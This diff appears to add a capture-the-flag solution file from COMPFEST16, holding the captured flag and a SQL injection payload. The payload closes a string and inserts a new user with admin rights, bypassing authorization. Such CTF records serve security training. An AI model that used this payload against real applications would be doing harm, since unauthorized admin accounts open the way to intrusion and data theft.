@@ -1,0 +1,5 @@
+Flag
+COMPFEST16{aLw4Ys_uS3_pr3P4reD_st4tEm3NTS_e3ae331a90}
+
+Payload
+';INSERT INTO users (username, password, is_admin) VALUES ('kacang', 'bakar', 1);-- 
